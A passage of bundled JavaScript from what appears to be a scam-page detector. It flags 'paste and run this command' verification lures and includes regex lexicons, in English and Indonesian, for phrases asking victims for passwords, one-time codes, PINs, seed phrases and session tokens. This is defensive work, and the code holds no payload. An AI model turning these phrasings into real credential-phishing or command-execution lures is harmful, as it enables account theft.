    \u03BD: "v",
    \u03BF: "o",
    \u03C1: "p",
    \u03C5: "u",
    \u03C7: "x",
    // Latin script variants
    \u0261: "g",
    \u0131: "i"
  }, COMBINING_MARK = new RegExp("\\p{M}", "u"), COMBINING_MARKS = new RegExp("\\p{M}", "gu"), WHITESPACE = /\s/u;
  function normalize(original) {
    let out = [], starts = [], ends = [], altered = [], pendingAltered = !1, emit = (unit, start, end, wasAltered) => {
      for (let k = 0; k < unit.length; k++)
        out.push(unit[k]), starts.push(start), ends.push(end), altered.push(wasAltered);
    }, emitSpace = (start, end) => {
      let last = out.length - 1;
      if (last >= 0 && out[last] === " ") {
        ends[last] = end;
        return;
      }
      emit(" ", start, end, !1);
    }, i = 0;
    for (; i < original.length; ) {
      let start = i, cp = original.codePointAt(i);
      for (i += cp > 65535 ? 2 : 1; i < original.length && COMBINING_MARK.test(original[i]); ) i++;
      let unit = original.slice(start, i), base = String.fromCodePoint(cp);
      if (INVISIBLE.has(base)) {
        pendingAltered = !0;
        continue;
      }
      if (WHITESPACE.test(base)) {
        emitSpace(start, i);
        continue;
      }
      let folded = unit.normalize("NFKC").toLowerCase().normalize("NFD").replace(COMBINING_MARKS, "");
      for (let ch of folded) {
        if (WHITESPACE.test(ch)) {
          emitSpace(start, i);
          continue;
        }
        let conf = CONFUSABLES[ch];
        emit(conf ?? ch, start, i, pendingAltered || conf !== void 0), pendingAltered = !1;
      }
    }
    return { text: out.join(""), starts, ends, altered };
  }
  function toOriginalRange(n, s, e) {
    if (e <= s) {
      let at = n.starts[s] ?? n.ends[n.ends.length - 1] ?? 0;
      return { start: at, end: at };
    }
    return { start: n.starts[s], end: n.ends[e - 1] };
  }
  function isAlteredRange(n, s, e) {
    for (let k = s; k < e; k++) if (n.altered[k]) return !0;
    return !1;
  }

  // src/core/observe.ts
  var CLAUSE_BREAK = new RegExp("[,;:.!?]|(?<![\\p{L}\\p{N}_])(?:and|then|or|but|dan|lalu|kemudian|atau|tapi|tetapi)(?![\\p{L}\\p{N}_])", "u"), SENTENCE_BREAK = /[.!?]/u;
  function matchSource(src) {
    let raw = [];
    for (let entry5 of LEXICON)
      if (!(src.ref.type !== "block" && kindOf(entry5.signal) !== "action")) {
        entry5.pattern.lastIndex = 0;
        for (let m of src.norm.text.matchAll(entry5.pattern))
          m[0].length !== 0 && raw.push({ entry: entry5, s: m.index, e: m.index + m[0].length });
      }
    let rank = (x) => x.entry.strength === "strong" ? 0 : 1;
    raw.sort((a, b) => rank(a) - rank(b) || a.s - b.s || b.e - a.e || a.entry.id.localeCompare(b.entry.id));
    let kept = /* @__PURE__ */ new Map(), out = [];
    for (let r of raw) {
      let spans = kept.get(r.entry.signal) ?? [];
      if (spans.some(([s, e]) => r.s < e && s < r.e)) continue;
      spans.push([r.s, r.e]), kept.set(r.entry.signal, spans);
      let range = toOriginalRange(src.norm, r.s, r.e);
      out.push({
        src,
        nStart: r.s,
        nEnd: r.e,
        o: {
          id: "",
          signal: r.entry.signal,
          kind: kindOf(r.entry.signal),
          entryId: r.entry.id,
          lang: r.entry.lang,
          strength: r.entry.strength,
          source: src.ref,
          start: range.start,
          end: range.end,
          text: src.text.slice(range.start, range.end),
          deobfuscated: isAlteredRange(src.norm, r.s, r.e),
          regionId: src.region.region.id,
          negated: !1,
          reported: !1
        }
      });
    }
    return out;
  }
  function structuralTrigger(src) {
    return {
      src,
      nStart: 0,
      nEnd: src.norm.text.length,
      o: {
        id: "",
        signal: "A.COPY_TRIGGER",
        kind: "action",
        entryId: "structural.copy_trigger",
        lang: "any",
        strength: "strong",
        source: src.ref,
        start: 0,
        end: src.text.length,
        text: src.text,
        deobfuscated: !1,
        regionId: src.region.region.id,
        negated: !1,
        reported: !1
      }
    };
  }
  function observeAll(sources, negation = !0, listIntroOutsideDialogsOnly = !1) {
    let signals = [], cues = [];
    for (let src of sources) {
      src.ref.type === "copyTrigger" && src.text.length > 0 && signals.push(structuralTrigger(src));
      for (let ob of matchSource(src)) (ob.o.kind === "context" ? cues : signals).push(ob);
    }
    return negation && bindNegation(signals, cues), bindReported(signals, cues, listIntroOutsideDialogsOnly), { signals, cues };
  }
  function cuesIn(cues, src, signal) {
    return cues.filter((c) => c.src === src && c.o.signal === signal);
  }
  function bindNegation(signals, cues) {
    for (let a of signals) {
      if (a.o.kind !== "action" || a.src.ref.type !== "block" || a.o.signal === "A.COMMAND") continue;
      let best;
      for (let c of cuesIn(cues, a.src, "C.NEGATION"))
        c.nEnd > a.nStart || a.nStart - c.nEnd > 40 || CLAUSE_BREAK.test(a.src.norm.text.slice(c.nEnd, a.nStart)) || (!best || c.nEnd > best.nEnd) && (best = c);
      best && (a.o.negated = !0, a.boundBy = best);
    }
  }
  function bindReported(signals, cues, listIntroOutsideDialogsOnly) {
    for (let a of signals) {
      if (a.o.kind !== "action" || a.src.ref.type !== "block" || a.o.negated) continue;
      let cue = cuesIn(cues, a.src, "C.REPORTED").find(
        (c) => c.nEnd <= a.nStart && !SENTENCE_BREAK.test(a.src.norm.text.slice(c.nEnd, a.nStart))
      );
      cue || (cue = listIntroCue(a, cues, listIntroOutsideDialogsOnly)), cue && (a.o.reported = !0, a.boundBy = cue);
    }
  }
  function listIntroCue(a, cues, outsideDialogsOnly) {
    let region = a.src.region;
    for (let p = a.src.pos - 1; p >= 0 && a.src.pos - p < 8; p--) {
      let block = region.blocks[p];
      if (!(!block || !/:\s*$/u.test(block.text)))
        return outsideDialogsOnly && (block.ctx?.dialog || block.ctx?.overlay) ? void 0 : cues.find((c) => c.src.block === block && c.o.signal === "C.REPORTED");
    }
  }
  function isDirect(a) {
    return !a.o.reported && !(a.src.block?.ctx?.quote ?? !1);
  }

  // src/core/correlate.ts
  var RULES = [
    { id: "R1", name: "VERIFICATION_EXEC_CHAIN", classification: "manipulative_instruction" },
    { id: "R2", name: "VERIFICATION_DELIVERED_COMMAND", classification: "manipulative_instruction" },
    { id: "R3", name: "VERIFICATION_PARTIAL_CHAIN", classification: "suspicious_correlation" },
    { id: "R4", name: "PRESSURE_EXEC_CORRELATION", classification: "suspicious_correlation" },
    { id: "R5", name: "OBSERVED_EXEC_INSTRUCTION", classification: "observed_instruction" }
  ], RULE_RANK = { R1: 0, R2: 1, R3: 2, R4: 3, R5: 4 }, WEAK_PRETEXTS = ["P.FAKE_FIX", "P.URGENCY", "P.AUTHORITY"];
  function readingOrder(a, b) {
    return a.src.pos - b.src.pos || a.src.order - b.src.order || a.nStart - b.nStart;
  }
  var after = (x, y) => readingOrder(x, y) > 0, of = (list, signal) => list.filter((o) => o.o.signal === signal);
  function evaluateWindow(actions, pretexts, experimental = {}, concealedInWindow = !1) {
    let opens = of(actions, "A.OPEN_RUN"), pastes = of(actions, "A.PASTE"), execs = of(actions, "A.EXECUTE"), triggers = of(actions, "A.COPY_TRIGGER"), strongCommands = of(actions, "A.COMMAND").filter((o) => o.o.strength === "strong"), open = opens[0], paste = open && pastes.find((p) => after(p, open)), exec = paste && execs.find((e) => after(e, paste)), chain = open && paste && exec ? [open, paste, exec] : null, second = open && [...pastes, ...execs].sort(readingOrder).find((x) => after(x, open)), partial = !chain && open && second ? [open, second] : null, hiddenCommand = strongCommands.find((c) => c.src.ref.type === "hiddenCopy"), command = hiddenCommand ?? strongCommands[0], delivery = triggers[0] ?? opens[0] ?? pastes[0] ?? execs[0], delivered = command && (hiddenCommand || delivery) ? [command, ...delivery ? [delivery] : []] : null, verify = of(pretexts, "P.HUMAN_VERIFY"), weak = pretexts.filter((p) => WEAK_PRETEXTS.includes(p.o.signal)), weakFamilies = WEAK_PRETEXTS.filter((s) => weak.some((p) => p.o.signal === s)), rule = (id) => RULES[RULE_RANK[id]];
    if (chain && verify.length > 0)
      return { rule: rule("R1"), actions: chain, pretexts: verify, baseConfidence: "high", actionRisk: "high", weakFamilies };
    if (delivered && verify.length > 0)
      return { rule: rule("R2"), actions: delivered, pretexts: verify, baseConfidence: "high", actionRisk: "high", weakFamilies };
    if (partial && verify.length > 0)
      return { rule: rule("R3"), actions: partial, pretexts: verify, baseConfidence: "medium", actionRisk: "medium", weakFamilies };
    let execution = chain ?? delivered, r4Families = weakFamilies.length === 1 && weakFamilies[0] === "P.AUTHORITY" && (experimental.r4ExcludeAuthorityOnly || experimental.r4AuthorityOnlyUnlessConcealed && !concealedInWindow) ? 0 : weakFamilies.length;
    if (execution && r4Families > 0 && r4Families >= (experimental.r4MinWeakFamilies ?? 1))
      return {
        rule: rule("R4"),
        actions: execution,
        pretexts: weak,
        baseConfidence: weakFamilies.length >= 2 ? "medium" : "low",
        actionRisk: "high",
        weakFamilies
      };
    let observed = chain ?? delivered ?? partial;
    return observed ? {
      rule: rule("R5"),
      actions: observed,
      pretexts: [],
      baseConfidence: "high",
      actionRisk: chain || delivered ? "high" : "medium",
      weakFamilies
    } : null;
  }
  function findCandidates(region, regionObs, options = {}, concealed = /* @__PURE__ */ new Set()) {
    let k = options.windowBlocks ?? 8;
    if (region.unplaced) return [];
    let sorted = [...regionObs].sort(readingOrder), n = region.blocks.length, lastStart = Math.max(0, n - k), out = [], lo = 0, hi = 0;
    for (let s = 0; s <= lastStart; s++) {
      let end = s + k;
      for (; lo < sorted.length && sorted[lo].src.pos < s - 0.5; ) lo++;
      for (; hi < sorted.length && sorted[hi].src.pos < end; ) hi++;
      let win = sorted.slice(lo, hi), actions = win.filter((o) => o.o.kind === "action" && !o.o.negated), pretexts = win.filter((o) => o.o.kind === "pretext"), concealedPayloads2 = win.filter((o) => concealed.has(o)), seen = /* @__PURE__ */ new Set();
      for (let pass of [actions.filter(isDirect), actions]) {
        let m = evaluateWindow(pass, pretexts, options.experimental, concealedPayloads2.length > 0);
        if (!m) continue;
        let evidence = [...m.actions, ...m.pretexts], key = `${m.rule.id}|${evidence.map((o) => `${o.src.pos}:${o.src.order}:${o.nStart}:${o.o.signal}`).join(",")}`;
        if (seen.has(key)) continue;
        seen.add(key);
        let positions = evidence.map((o) => o.src.pos);
        out.push({ ...m, region, windowStart: s, windowEnd: end, spanMin: Math.min(...positions), spanMax: Math.max(...positions), concealedPayloads: concealedPayloads2 });
      }
    }
    return out;
  }

  // src/core/modifiers.ts
  var TIERS = ["observed_instruction", "suspicious_correlation", "manipulative_instruction"], LEVELS = ["low", "medium", "high"], MAX_TOTAL_DEMOTION = 2, EDUCATIONAL = LEXICON.filter((e) => e.signal === "C.EDUCATIONAL"), GATE_MAX_OTHER_WORDS = 25, words = (t2) => t2.split(/\s+/u).filter(Boolean).length;
  function blockEvidence(c) {
    return [...new Set([...c.actions, ...c.pretexts].map((o) => o.src.block).filter((b) => !!b))];
  }
  function isVerificationGate(c) {
    let ev = blockEvidence(c);
    if (ev.length === 0 || !ev.every((b) => b.ctx?.dialog || b.ctx?.overlay) || !c.pretexts.some((p) => p.o.signal === "P.HUMAN_VERIFY")) return !1;
    let evIds = new Set(ev.map((b) => b.id));
    return c.region.blocks.filter((b) => !evIds.has(b.id)).reduce((n, b) => n + words(b.text), 0) < GATE_MAX_OTHER_WORDS;
  }
  function isProceduralDoc(c, dialogs = !1) {
    if (c.rule.id !== "R4" || c.weakFamilies.length !== 1 || c.concealedPayloads.length > 0) return !1;
    let ev = blockEvidence(c);
    if (ev.length === 0) return !1;
    let inArticle = ev.every((b) => !b.ctx?.dialog && !b.ctx?.overlay && b.ctx?.article), inDialog = dialogs && ev.every((b) => b.ctx?.dialog || b.ctx?.overlay) && !c.pretexts.some((p) => p.o.signal === "P.HUMAN_VERIFY");
    return !inArticle && !inDialog ? !1 : c.region.blocks.some((b) => b.ctx?.pre || b.ctx?.code);
  }
  function ownVoiceVerification(c) {
    return c.pretexts.some((p) => p.o.signal === "P.HUMAN_VERIFY" && !p.o.reported && !p.src.block?.ctx?.quote && !p.src.block?.ctx?.code && !p.src.block?.ctx?.pre);
  }
  function isCodeBlock(b) {
    return !!(b?.ctx && (b.ctx.code || b.ctx.pre) && b.ctx.article);
  }
  function headingIsEducational(heading, memo) {
    let hit = memo.get(heading);
    if (hit === void 0) {
      let text = normalize(heading).text;
      hit = EDUCATIONAL.some((e) => {
        e.pattern.lastIndex = 0;
        let ok = e.pattern.test(text);
        return e.pattern.lastIndex = 0, ok;
      }), memo.set(heading, hit);
    }
    return hit;
  }
  function proseWords(blocks) {
    let words2 = 0;
    for (let b of blocks) b.ctx?.code || b.ctx?.pre || (words2 += b.text.split(/\s+/u).filter(Boolean).length);
    return words2;
  }
  function applyModifiers(c, cues, memo, options = {}) {
    let mods = [], x = options.experimental ?? {}, evidenceInDialog = [...c.actions, ...c.pretexts].every((o) => o.src.block?.ctx?.dialog || o.src.block?.ctx?.overlay || o.src.ref.type !== "block");
    if (options.contextModifiers === !1 || x.noDemotionInDialogs && evidenceInDialog)
      return { ...c, modifiers: mods, overrides: [], classification: c.rule.classification, confidence: c.baseConfidence };
    let blockActions = c.actions.filter((a) => a.src.ref.type === "block"), quoted = blockActions.filter((a) => a.src.block?.ctx?.quote);
    blockActions.length > 0 && quoted.length * 2 >= blockActions.length && mods.push({ id: "C.QUOTED", demoteBy: 2, reason: "The instruction is inside a quotation.", evidence: quoted });
    let reported = c.actions.filter((a) => a.o.reported);
    if (reported.length > 0) {
      let cueObs = reported.map((a) => a.boundBy).filter((x2) => x2 !== void 0);
      mods.push({
        id: "C.REPORTED",
        demoteBy: 2,
        reason: "The text reports what someone else was told to do rather than instructing the reader.",
        evidence: [...new Set(cueObs)]
      });
    }
    let eduCues = cues.filter(
      (k) => k.o.signal === "C.EDUCATIONAL" && k.src.region === c.region && k.src.pos >= c.windowStart && k.src.pos < c.windowEnd
    ), eduHeadings = [...new Set([...c.actions, ...c.pretexts].map((o) => o.src.block).filter((b) => !!b))].filter((b) => b.headingContext && headingIsEducational(b.headingContext, memo));
    (eduCues.length > 0 || eduHeadings.length > 0) && mods.push({
      id: "C.EDUCATIONAL",
      demoteBy: 1,
      reason: "The surrounding text is educational or awareness material.",
      evidence: [...eduCues, ...eduHeadings.map((b) => `heading:${b.id}`)]
    }), blockActions.length > 0 && c.actions.every((a) => a.src.ref.type === "copyTrigger" || a.src.ref.type === "block" && isCodeBlock(a.src.block)) && proseWords(c.region.blocks) >= 15 && mods.push({
      id: "C.CODE_EXAMPLE",
      demoteBy: 1,
      reason: "The instruction is a code example inside an article with explanatory prose.",
      evidence: [...new Set(blockActions.map((a) => `block:${a.src.block?.id ?? ""}`))]
    }), x.proceduralDocModifier && isProceduralDoc(c, x.proceduralDialogs === !0) && mods.push({
      id: "C.PROCEDURAL",
      demoteBy: 1,
      reason: "The instruction is a step in a procedural document (article with code) and its only pretext is a common troubleshooting or notice phrase.",
      evidence: [...new Set(blockEvidence(c).map((b) => `block:${b.id}`))]
    });
    let overrides = [], contextual = mods.filter((m) => m.id !== "C.PROCEDURAL");
    if (contextual.length > 0) {
      let suppressed = contextual.map((m) => m.id);
      x.concealedPayloadOverride && c.concealedPayloads.length > 0 ? overrides.push({
        id: "O.CONCEALED_PAYLOAD",
        effect: "suppressed",
        suppressed,
        evidence: c.concealedPayloads,
        reason: "The same part of the page places hidden text on the clipboard, which a quotation, report or tutorial would not do."
      }) : (x.verificationGateOverride || x.ownVoiceGateOverride) && isVerificationGate(c) && (!x.ownVoiceGateOverride || x.verificationGateOverride || ownVoiceVerification(c)) && overrides.push({
        id: "O.VERIFICATION_GATE",
        effect: x.verificationGateOverride === "skip" ? "suppressed" : "capped-at-1",
        suppressed,
        evidence: c.pretexts.filter((p) => p.o.signal === "P.HUMAN_VERIFY"),
        reason: "The instruction sits in a short verification dialog addressed to the reader."
      });
    }
    let effect = overrides[0]?.effect, kept = effect === "suppressed" ? mods.filter((m) => m.id === "C.PROCEDURAL") : mods, total = kept.reduce((sum, m) => sum + m.demoteBy, 0), demotion = Math.min(effect === "capped-at-1" ? 1 : MAX_TOTAL_DEMOTION, total), tier = TIERS.indexOf(c.rule.classification), level = LEVELS.indexOf(c.baseConfidence);
    return {
      ...c,
      modifiers: kept,
      overrides,
      classification: TIERS[Math.max(0, tier - demotion)],
      confidence: LEVELS[Math.max(0, level - kept.length - overrides.length)]
    };
  }

  // src/core/regions.ts
  function buildRegions(blocks) {
    let out = [], run = [], flush = () => {
      if (run.length === 0) return;
      let first = run[0], last = run[run.length - 1];
      out.push({
        region: {
          id: `${first.containerId}:${first.id}-${last.id}`,
          containerId: first.containerId,
          blockIds: run.map((b) => b.id)
        },
        index: out.length,
        blocks: run,
        unplaced: !1
      }), run = [];
    };
    for (let b of blocks)
      run.length > 0 && run[0].containerId !== b.containerId && flush(), run.push(b);
    return flush(), out;
  }
  function unplacedRegion(containerId, index) {
    return {
      region: { id: `${containerId}:unplaced`, containerId, blockIds: [] },
      index,
      blocks: [],
      unplaced: !0
    };
  }

  // src/core/analyze.ts
  function validate(s) {
    if (s.schemaVersion !== 1) throw new Error(`Unsupported PageSnapshot schemaVersion: ${String(s.schemaVersion)}`);
    let seen = /* @__PURE__ */ new Set(), check2 = (kind, id) => {
      let key = `${kind}:${id}`;
      if (seen.has(key)) throw new Error(`Duplicate ${kind} id in PageSnapshot: ${id}`);
      seen.add(key);
    };
    for (let b of s.blocks) check2("block", b.id);
    for (let h2 of s.hiddenCopyCandidates) check2("hiddenCopy", h2.id);
    for (let t2 of s.copyTriggers) check2("copyTrigger", t2.id);
  }
  function buildSources(s, regions) {
    let truncated = s.blocks.length > 5e3, clip2 = (text, max) => text.length <= max ? text : (truncated = !0, text.slice(0, max)), blockPlacement = /* @__PURE__ */ new Map();
    for (let r of regions) r.blocks.forEach((b, i) => blockPlacement.set(b.id, { region: r, pos: i }));
    let firstRegionOf = /* @__PURE__ */ new Map();
    for (let r of regions) firstRegionOf.has(r.region.containerId) || firstRegionOf.set(r.region.containerId, r);
    let place = (containerId, afterBlockId) => {
      let anchor = afterBlockId === void 0 ? void 0 : blockPlacement.get(afterBlockId);
      if (anchor) return { region: anchor.region, pos: anchor.pos + 0.5 };
      let region = firstRegionOf.get(containerId);
      return region || (region = unplacedRegion(containerId, regions.length), regions.push(region), firstRegionOf.set(containerId, region)), { region, pos: -0.5 };
    }, sources = [];
    for (let r of regions.slice())
      r.blocks.forEach((b, i) => {
        let text = clip2(b.text, 2e3);
        sources.push({ ref: { type: "block", blockId: b.id }, text, norm: normalize(text), region: r, pos: i, order: 0, block: b });
      });
    return (s.hiddenCopyCandidates.length > 200 || s.copyTriggers.length > 200) && (truncated = !0), s.hiddenCopyCandidates.slice(0, 200).forEach((h2, i) => {
      let text = clip2(h2.text, 4e3), p = place(h2.containerId, h2.afterBlockId);
      sources.push({ ref: { type: "hiddenCopy", candidateId: h2.id }, text, norm: normalize(text), region: p.region, pos: p.pos, order: 1 + i });
    }), s.copyTriggers.slice(0, 200).forEach((t2, i) => {
      let text = clip2(t2.label, 4e3), p = place(t2.containerId, t2.afterBlockId);
      sources.push({ ref: { type: "copyTrigger", triggerId: t2.id }, text, norm: normalize(text), region: p.region, pos: p.pos, order: 201 + i });
    }), { sources, truncated };
  }
  function overlaps(a, b) {
    return a.region === b.region && a.spanMin <= b.spanMax && b.spanMin <= a.spanMax;
  }
  function select(cands) {
    let ranked = [...cands].sort(
      (a, b) => TIERS.indexOf(b.classification) - TIERS.indexOf(a.classification) || RULE_RANK[a.rule.id] - RULE_RANK[b.rule.id] || a.region.index - b.region.index || a.spanMin - b.spanMin || a.windowStart - b.windowStart
    ), chosen = [];
    for (let c of ranked) chosen.some((k) => overlaps(k, c)) || chosen.push(c);
    return chosen.sort((a, b) => a.region.index - b.region.index || a.spanMin - b.spanMin || RULE_RANK[a.rule.id] - RULE_RANK[b.rule.id]);
  }
  function blockIdAt(c, pos) {
    let i = Math.min(c.region.blocks.length - 1, Math.max(0, Math.floor(pos)));
    return c.region.blocks[i]?.id ?? "";
  }
  var SUMMARY = {
    R1: "This region tells the reader to open a command surface, paste and execute, presented as a human-verification step.",
    R2: "This region delivers an executable command to the reader, presented as a human-verification step.",
    R3: "This region contains part of an open-paste-execute sequence, presented as a human-verification step.",
    R4: "This region tells the reader to execute code and uses a pressure or problem-fixing pretext",
    R5: "This region contains an instruction to execute code. No manipulation pretext was found in the same region."
  };
  function summarize(c) {
    let text = SUMMARY[c.rule.id];
    return c.rule.id === "R4" && (text += ` (${c.weakFamilies.map((f) => f.slice(2).toLowerCase()).join(", ")}).`), c.modifiers.length > 0 && (text += ` Context: ${c.modifiers.map((m) => m.reason).join(" ")}`), c.overrides.length > 0 && (text += ` Not lowered: ${c.overrides.map((o) => o.reason).join(" ")}`), text;
  }
  function refKey(r) {
    return r.type === "block" ? `b:${r.blockId}` : r.type === "hiddenCopy" ? `h:${r.candidateId}` : `t:${r.triggerId}`;
  }
  var M41_RULESET = {
    r4AuthorityOnlyUnlessConcealed: !0,
    concealedPayloadOverride: !0,
    proceduralDocModifier: !0
  }, M5_RULESET = {
    ...M41_RULESET,
    ownVoiceGateOverride: !0,
    proceduralDialogs: !0
  };
  function resolveOptions(options) {
    if (options.ruleset === "m1") return options;
    let base = options.ruleset === "m4.1" || options.ruleset === "m4.1-rc1" ? M41_RULESET : M5_RULESET;
    return { ...options, experimental: { ...base, ...options.experimental } };
  }
  function concealedPayloads(sources, signals) {
    let visible = sources.filter((s) => s.ref.type === "block").map((s) => s.norm.text).join(`
`), out = /* @__PURE__ */ new Set();
    for (let o of signals) {
      if (o.src.ref.type !== "hiddenCopy" || o.o.signal !== "A.COMMAND" || o.o.strength !== "strong") continue;
      let payload = o.src.norm.text.trim();
      payload && !visible.includes(payload) && out.add(o);
    }
    return out;
  }
  function analyze(snapshot, rawOptions = {}) {
    validate(snapshot);
    let options = resolveOptions(rawOptions), x = options.experimental ?? {}, regions = buildRegions(snapshot.blocks.slice(0, 5e3)), { sources, truncated } = buildSources(snapshot, regions), { signals, cues } = observeAll(sources, options.negation !== !1, x.reportedListIntroOutsideDialogsOnly === !0), concealed = concealedPayloads(sources, signals), byRegion = /* @__PURE__ */ new Map();
    for (let o of signals) {
      let list = byRegion.get(o.src.region) ?? [];
      list.push(o), byRegion.set(o.src.region, list);
    }
    let memo = /* @__PURE__ */ new Map(), scored = [];
    for (let r of regions)
      for (let c of findCandidates(r, byRegion.get(r) ?? [], options, concealed)) scored.push(applyModifiers(c, cues, memo, options));
    let selected = select(scored), usedCues = /* @__PURE__ */ new Set();
    for (let o of signals) o.boundBy && usedCues.add(o.boundBy);
    for (let c of selected) for (let m of c.modifiers) for (let e of m.evidence) typeof e != "string" && usedCues.add(e);
    let outObs = [...signals, ...[...usedCues].filter((c) => c.o.kind === "context")].filter((o, i, arr) => arr.indexOf(o) === i).sort((a, b) => a.src.region.index - b.src.region.index || readingOrder(a, b) || a.o.signal.localeCompare(b.o.signal) || refKey(a.o.source).localeCompare(refKey(b.o.source))), idOf = /* @__PURE__ */ new Map();
    outObs.forEach((o, i) => idOf.set(o, `o${i}`));
    let findings = selected.map((c, i) => ({
      id: `f${i}`,
      ruleId: c.rule.id,
      ruleName: c.rule.name,
      classification: c.classification,
      ruleClassification: c.rule.classification,
      confidence: c.confidence,
      actionRisk: c.actionRisk,
      regionId: c.region.region.id,
      span: { firstBlockId: blockIdAt(c, c.spanMin), lastBlockId: blockIdAt(c, c.spanMax) },
      observationIds: [...c.actions, ...c.pretexts].sort(readingOrder).map((o) => idOf.get(o)),
      modifiers: c.modifiers.map((m) => ({
        id: m.id,
        demoteBy: m.demoteBy,
        reason: m.reason,
        evidence: m.evidence.map((e) => typeof e == "string" ? e : idOf.get(e))
      })),
      ...c.overrides.length > 0 ? { overrides: c.overrides.map((o) => ({ ...o, evidence: o.evidence.map((e) => idOf.get(e)) })) } : {},
      summary: summarize(c)
    })), verdict = "none";
    for (let f of findings) (verdict === "none" || TIERS.indexOf(f.classification) > TIERS.indexOf(verdict)) && (verdict = f.classification);
    return {
      engineVersion: options.ruleset === "m1" ? ENGINE_VERSION_M1 : options.ruleset === "m4.1" || options.ruleset === "m4.1-rc1" ? ENGINE_VERSION_M41 : ENGINE_VERSION,
      schemaVersion: 1,
      verdict,
      findings,
      observations: outObs.map((o) => ({ ...o.o, id: idOf.get(o) })),
      regions: regions.map((r) => r.region),
      coverage: { ...snapshot.coverage, coreTruncated: truncated }
    };
  }

  // src/core/awareness.ts
  var CARRIER = "(?:pesan|sms|telepon|telpon|panggilan|akun|pihak|oknum|tautan|link|modus|penipu|orang)", AWARENESS_ID = `${B}(?:waspada(?:i|lah)?|hati-hati(?:lah)?)\\s+(?:terhadap\\s+|dengan\\s+)?${CARRIER}${E}`, AWARENESS_ID_EXAMPLES = ["Waspadai pesan", "hati-hati terhadap tautan", "waspada terhadap oknum"], IMPERSONATION_REPORT_ID = `${B}${CARRIER}\\s+(?:yang|yg)\\s+(?:mengatasnamakan|mengaku(?:\\s+sebagai)?)${E}`, IMPERSONATION_REPORT_ID_EXAMPLES = ["pesan yang mengatasnamakan", "oknum yang mengaku sebagai", "pihak yg mengatasnamakan"];

  // src/core/credential/lexicon.ts
  function entry2(id, signal, lang, strength, source, examples) {
    return { id, signal, lang, strength, pattern: new RegExp(source, "gu"), examples };
  }
  var YOUR = "(?:your\\s+|the\\s+|this\\s+|that\\s+|my\\s+|a\\s+|any\\s+)?", ANDA = "(?:\\s+(?:anda|kamu|mu|nya|lu|lo|elu|loe|tersebut|ini|itu))?", SECRETS = [
    entry2("cred.en.secret.password", "S.PASSWORD", "en", "strong", `${B}(?:password|passcode|passwd)s?${E}`, ["password", "Passcode"]),
    entry2(
      "cred.en.secret.otp",
      "S.OTP",
      "en",
      "strong",
      `${B}(?:one[\\s-]?time\\s+(?:pass)?code|otp(?:\\s+code)?|verification\\s+code|security\\s+code|login\\s+code|sign[\\s-]?in\\s+code|2fa\\s+code|authentication\\s+code|sms\\s+code|(?:6|six|4|four)[\\s-]?digit\\s+code|code\\s+(?:we|i|you)\\s+(?:just\\s+)?(?:sent|texted|received)|code\\s+(?:sent|texted)\\s+to\\s+your\\s+(?:phone|number|mobile|email))${E}`,
      ["one-time code", "OTP", "verification code", "the 6-digit code", "code we just sent", "code sent to your phone"]
    ),
    entry2("cred.en.secret.pin", "S.PIN", "en", "strong", `${B}(?:atm\\s+|card\\s+|account\\s+|wallet\\s+)?pin(?:\\s+(?:code|number))?${E}`, ["PIN", "ATM PIN"]),
    entry2("cred.en.secret.recovery_code", "S.RECOVERY_CODE", "en", "strong", `${B}(?:recovery|backup)\\s+codes?${E}`, ["recovery code", "backup codes"]),
    entry2(
      "cred.en.secret.seed",
      "S.SEED_PHRASE",
      "en",
      "strong",
      `${B}(?:(?:secret\\s+)?recovery\\s+phrase|seed\\s+(?:phrase|words?)|mnemonic(?:\\s+phrase)?|(?:12|24|twelve|twenty[\\s-]four)[\\s-]words?(?:\\s+(?:recovery\\s+)?phrase)?|wallet\\s+phrase|private\\s+key)${E}`,
      ["Secret Recovery Phrase", "seed phrase", "12-word phrase", "private key"]
    ),
    entry2(
      "cred.en.secret.token",
      "S.TOKEN",
      "en",
      "strong",
      `${B}(?:(?:auth(?:entication)?|access|session|api|bearer|login)\\s+tokens?|session\\s+cookies?)${E}`,
      ["session token", "API token", "session cookie"]
    ),
    entry2("cred.id.secret.password", "S.PASSWORD", "id", "strong", `${B}(?:kata\\s+sandi|sandi|kata\\s+kunci|data\\s+(?:login|masuk\\s+akun)|kredensial)${E}`, ["kata sandi", "sandi", "data login", "kredensial"]),
    entry2(
      "cred.id.secret.otp",
      "S.OTP",
      "id",
      "strong",
      `${B}(?:kode\\s+(?:otp|verif(?:ikasi)?|keamanan|sms|aktivasi)|otp|kode\\s+(?:(?:yang|yg)\\s+)?(?:barusan\\s+|baru\\s+|tadi\\s+)?(?:masuk|dikirim|terkirim|nyampe|sampe)(?:\\s+(?:ke|di|lewat)\\s+(?:hp|ponsel|sms|nomor|wa|whatsapp)(?:\\s+(?:anda|kamu|mu|lu|lo|elu|kakak|kak|ka|bro|sis|gan|mas|mbak|bang))?)?|kode\\s+(?:6|enam)\\s+digit|kode\\s+(?:login\\s+|masuk\\s+)?sekali\\s+pakai|kode\\s+(?:login|masuk|akses))${E}`,
      ["kode OTP", "kode sekali pakai", "kode login sekali pakai", "kode login", "kode verifikasi", "kode verif", "kode yang masuk ke HP", "kode yg barusan masuk", "kode yang dikirim"]
    ),
    // Informal: the code described only as digits that just arrived ("angka yg barusan masuk ke hp lu", "6 angka dari sms tadi").
    entry2(
      "cred.id.secret.otp_digits",
      "S.OTP",
      "id",
      "strong",
      `${B}(?:(?:\\d|enam|empat)\\s+)?(?:angka|digit)\\s+(?:(?:yang|yg)\\s+(?:barusan\\s+|baru\\s+(?:aja\\s+|saja\\s+)?|tadi\\s+)?(?:masuk|dikirim|nyampe|sampe|sampai|muncul)|dari\\s+(?:sms|wa|whatsapp))(?:\\s+(?:ke|di)\\s+(?:hp|ponsel|wa|nomor)(?:\\s+(?:anda|kamu|mu|lu|lo|elu))?)?${E}`,
      ["angka yg barusan masuk ke hp lu", "6 angka dari sms", "angka yang masuk"]
    ),
    entry2("cred.id.secret.pin", "S.PIN", "id", "strong", `${B}pin(?:\\s+(?:atm|m-?banking|kartu|transaksi))?${E}`, ["PIN", "PIN ATM"]),
    entry2("cred.id.secret.recovery_code", "S.RECOVERY_CODE", "id", "strong", `${B}kode\\s+(?:pemulihan|cadangan)${E}`, ["kode pemulihan"]),
    entry2(
      "cred.id.secret.seed",
      "S.SEED_PHRASE",
      "id",
      "strong",
      `${B}(?:frasa\\s+(?:pemulihan|rahasia|benih|dompet)|(?:12|24)\\s+kata(?:\\s+(?:rahasia|pemulihan))?|kunci\\s+privat)${E}`,
      ["frasa pemulihan", "12 kata rahasia", "kunci privat"]
    ),
